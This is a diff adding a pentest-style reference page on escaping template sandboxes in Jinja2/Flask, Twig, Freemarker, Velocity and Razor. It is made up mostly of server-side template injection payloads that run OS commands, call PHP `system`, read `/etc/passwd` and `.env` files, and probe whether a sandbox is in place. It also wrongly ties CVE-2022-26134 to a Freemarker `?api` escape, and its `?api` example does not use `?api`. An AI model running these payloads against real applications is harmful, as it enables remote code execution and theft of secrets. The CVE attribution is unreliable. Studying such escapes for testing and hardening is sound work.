@@ -1,0 +1,270 @@
+---
+title: Sandbox escape
+description: Escaping restricted template execution environments - Flask SandboxedEnvironment, Twig sandbox mode, Freemarker secure_uberspect, Velocity secure_uberspect.
+mitre: [T1190, T1027]
+d3fend: [D3-EAL, D3-PE]
+impact: [ServerSideEval, RCE]
+sidebar:
+  order: 10
+  label: Sandbox escape
+---
+import { Aside, Tabs, TabItem } from '@astrojs/starlight/components';
+
+## TL;DR
+
+A template sandbox restricts what built-in helpers, attributes, and methods the engine exposes. Escape paths:
+
+- **Jinja2 sandbox** - string indexing instead of `__class__` attribute, `request.args` smuggle, `lipsum.__globals__` removed by Flask's SandboxedEnvironment but not by all subclasses
+- **Twig sandbox** - `filter`/`map`/`sort` callbacks with PHP function names, source/include with traversal
+- **Freemarker** - `?api` mechanism (added 2.3.22) bypasses `new_builtin_class_resolver` restrictions
+- **Velocity** - Velocity Tools `$class` survives some `secure_uberspect` configs; reflection through static fields when method access is restricted
+
+The general principle: sandboxes filter by name. Reach the same object through a different name (string indexing, reflection, namespace tricks) and the sandbox often doesn't see it.
+
+## What a sandbox actually blocks
+
+Sandboxes typically restrict three categories:
+
+1. **Attribute access** - `__class__`, `__mro__`, `getClass`, `class`, similar magic attributes that walk the runtime type system
+2. **Function names** - `eval`, `exec`, `system`, `popen`, `Runtime.exec`, similar direct command-execution APIs
+3. **Module imports** - `__import__`, `require`, `Type.GetType`, similar loaders
+
+Each engine implements these checks differently. None implement them completely. The bypasses below exploit the difference between "filtered name" and "reachable object."
+
+## Jinja2 - SandboxedEnvironment
+
+Flask's `SandboxedEnvironment` (and Jinja2's directly) blocks attribute access to names starting with `__`:
+
+```
+{{ ''.__class__ }}                           # blocked: "access to the attribute '__class__' of 'str' object is unsafe"
+```
+
+### Path A - String indexing instead of attribute access
+
+The sandbox checks `__getattr__`. String indexing (`__getitem__`) is a different code path:
+
+```
+{{ ''['__class__'] }}                        # often works where ''.__class__ is blocked
+{{ ''['__class__']['__mro__'][1]['__subclasses__']() }}
+```
+
+Some sandbox subclasses also filter `__getitem__` - test the simpler `''['__class__']` first.
+
+### Path B - `request.args` smuggle
+
+When the sandbox blocks the string literal `__class__` but allows attribute reads from `request`:
+
+```
+{{ ''[request.args.x][request.args.y][1][request.args.z]() }}
+```
+
+Then send the request with `?x=__class__&y=__mro__&z=__subclasses__`. The keyword `__class__` never appears in the template body - it arrives via the query string.
+
+### Path C - `attr` filter
+
+Jinja2's built-in `attr` filter is sometimes allowed when direct attribute access is blocked:
+
+```
+{{ ''|attr('__class__') }}
+{{ ''|attr('__class__')|attr('__mro__') }}
+```
+
+### Path D - `cycler` / `joiner` / `namespace` (Flask-specific)
+
+Flask exposes these helpers globally in templates. Their `__globals__` reaches `os` regardless of sandboxing on `__class__`:
+
+```
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+```
+
+If sandbox filters `__init__` specifically, try `__globals__` directly:
+
+```
+{{ cycler.__globals__.os.popen('id').read() }}
+```
+
+### Path E - `range`, `dict`, other built-in callables
+
+When most paths are blocked but Jinja2's built-in `range` is still callable:
+
+```
+{{ range.__globals__.os.popen('id').read() }}
+```
+
+Built-in callables like `range`, `dict`, `lipsum` have `__globals__` pointing into Jinja2's runtime module - which often has `os` imported for path manipulation.
+
+## Twig - Sandbox mode
+
+Twig's sandbox restricts:
+
+- Tags (`if`, `for` allowed by default; `set`, `extends`, `include` filtered)
+- Filters (`escape`, `length` allowed; `filter`, `map`, `reduce` NOT in default allowlist but often added)
+- Functions (`max`, `min` allowed; almost nothing else by default)
+- Methods on objects (none by default; allowlist per object class)
+
+### Path A - `filter` / `map` callbacks
+
+If the sandbox allowlist includes the `filter` or `map` filters (commonly added because they're useful), PHP function names work as callables:
+
+```
+{{['id']|filter('system')}}
+{{['id']|map('system')|join(',')}}
+{{['/etc/passwd']|map('file_get_contents')|join('')}}
+```
+
+The string `'system'` passes through the sandbox because it's a string, not a method call.
+
+### Path B - `source` and `include`
+
+If `source` is allowed (it often is - sandboxes use it for partials):
+
+```
+{{ source('../config/services.yaml') }}
+{{ source('../.env') }}
+```
+
+Path traversal here is loader-relative. Most Twig loaders are pinned to the templates directory; traversal escapes that to wherever the loader's root resolves.
+
+### Path C - `_self.env` reachability
+
+In hardened Twig, `_self.env` returns null or throws. In some sandbox subclasses, `_self.env` exists but specific methods are filtered:
+
+```
+{{_self.env.getRuntimeLoader()}}             # often allowed
+{{_self.env.getLoader().getSourceContext('foo').getCode()}}
+```
+
+The `getSourceContext` path reads template files directly, bypassing the application's view-resolution logic.
+
+## Freemarker - `new_builtin_class_resolver` restrictions
+
+Freemarker's sandbox restricts which classes `?new` can instantiate. When `new_builtin_class_resolver` is set to `TemplateClassResolver.ALLOWS_NOTHING_RESOLVER`, `?new` is disabled.
+
+### Path A - `?api` reflection (Freemarker 2.3.22+)
+
+The `?api` built-in exposes the Java API of any TemplateModel - bypassing `?new` restrictions entirely:
+
+```
+${"".getClass().forName("java.lang.Runtime").getMethod("exec",["".getClass()]).invoke(null,"id")}
+```
+
+This is the path CVE-2022-26134 (Confluence) used. The Freemarker sandbox didn't anticipate reflection through `?api` on objects already in scope.
+
+### Path B - Available built-ins
+
+Some Freemarker built-ins survive sandboxing and provide indirect file access:
+
+```
+${.now}                                      # current time - confirms eval
+${.template_name}                            # template path - info disclosure
+${.locale}                                   # server locale
+${.data_model?keys}                          # variable names in scope
+```
+
+`?.data_model?keys` reveals what application objects are available - frequently includes a `request`, `session`, or `app` object whose methods can be called via `?api`.
+
+## Velocity - `secure_uberspect`
+
+Velocity's `secure_uberspect` setting restricts reflection methods (`getClass`, `getMethod`, `invoke`). It's the closest analog to a true sandbox in Velocity.
+
+### Path A - Velocity Tools `$class`
+
+`$class.inspect(...)` uses a different code path than direct reflection - frequently survives `secure_uberspect`:
+
+```
+$class.inspect("java.lang.Runtime").type.getMethod("getRuntime").invoke(null).exec("id")
+```
+
+If Velocity Tools is loaded but reflection is blocked elsewhere, this is often the path.
+
+### Path B - Static fields
+
+When method access is blocked, static field access sometimes isn't:
+
+```
+#set($s="")
+#set($cls=$s.getClass().getSuperclass())     # often still works
+```
+
+The exact bypass depends on which methods `secure_uberspect` filters. Test individual reflection methods (`getClass`, `getSuperclass`, `getMethod`, `invoke`) - sandbox configurations frequently filter only the obvious ones.
+
+## ERB - no sandbox
+
+ERB does not implement a sandbox. Ruby applications wanting templated user input typically switch to **Liquid** (Shopify's restricted templating language) - which is genuinely sandboxed and very hard to escape. If you're hitting Liquid:
+
+```
+{{7 | times: 7}}                             # → 49 in Liquid
+```
+
+Liquid's filter syntax (`{{ x | filter }}`) is distinctive. RCE through Liquid is exceptionally difficult; most engagements stop at information disclosure (filter abuse to read template-context variables).
+
+## Razor - no sandbox by default
+
+Razor compiles to C# and runs with full BCL access. There is no built-in sandbox mode in either RazorEngine or RazorLight. Some applications implement custom sandboxes by analyzing the generated C# AST and rejecting forbidden namespaces - these are usually defeated by reflection:
+
+```
+@{ var t = System.Type.GetType("System.Diagnostics.Process"); /* ... */ }
+```
+
+The string `"System.Diagnostics.Process"` is data, not a namespace reference - AST-based filters often miss it.
+
+## Cross-engine principles
+
+The bypasses above share three principles:
+
+1. **Reach the object through data, not code.** `__class__`, `system`, `Runtime` as literal strings in `request.args` / `attr()` / `forName()` survive filters that block them as keywords.
+2. **Use the engine's most convenient API.** `_self.env` (Twig), `?api` (Freemarker), `$class` (Velocity Tools), `cycler.__globals__` (Flask) - engine-provided escape hatches are usually less filtered than the obvious reflection paths.
+3. **Look for *un*restricted callables.** Filters that look harmless (`filter`, `map`, `attr`) become arbitrary function call when their callback parameter is reached.
+
+## Detection - am I in a sandbox?
+
+Quick probes to identify sandbox presence:
+
+<Tabs>
+  <TabItem label="Jinja2">
+
+```
+{{ ''.__class__ }}                           # blocked → sandboxed
+{{ config }}                                 # empty → likely sandboxed (Flask normally exposes config)
+{{ ''['__class__'] }}                        # works where ''.__class__ doesn't → SandboxedEnvironment-style
+```
+
+  </TabItem>
+  <TabItem label="Twig">
+
+```
+{{_self.env}}                                # null/error → sandboxed
+{{[1]|filter('var_dump')}}                   # works → filter callback escape available
+{{ source('does_not_exist') }}               # error message reveals whether source is allowlisted
+```
+
+  </TabItem>
+  <TabItem label="Freemarker">
+
+```
+${"freemarker.template.utility.Execute"?new()}   # error → ?new restricted
+${.now?api}                                  # works → ?api available (escape path open)
+```
+
+  </TabItem>
+  <TabItem label="Velocity">
+
+```
+$s.getClass()                                # null/error → secure_uberspect on
+$class                                       # works → Velocity Tools loaded (likely path)
+```
+
+  </TabItem>
+</Tabs>
+
+<Aside type="tip">
+The most reliable single signal of sandbox presence: arithmetic works (`{{7*7}}` → `49`) but the engine-specific class-access probe fails. Arithmetic doesn't require reflection; the class probes do. If `7*7` evaluates and `''.__class__` doesn't, you're sandboxed.
+</Aside>
+
+## Notes
+
+- **Sandbox version matters.** Each engine has tightened sandboxing over time. Jinja2's SandboxedEnvironment was significantly hardened in 2.10 (April 2019). Twig's sandbox got the `_self` filter in 1.32 (March 2017). Freemarker's `?api` filter restrictions arrived in 2.3.27 (March 2018). Older deployments are far more exploitable.
+- **Custom sandbox subclasses.** Applications sometimes subclass the built-in sandboxes to add/remove restrictions. These customizations frequently introduce new gaps - the application's developers add a "useful" filter or expose a "safe" helper that the sandbox authors never considered.
+- **Sandbox != security boundary.** Template sandboxes are designed to prevent accidents in semi-trusted templates (a marketing user editing email copy), not to resist motivated attackers. Treat any successful template injection in a sandboxed engine as still potentially exploitable - give it five payloads from this page before concluding the sandbox is solid.
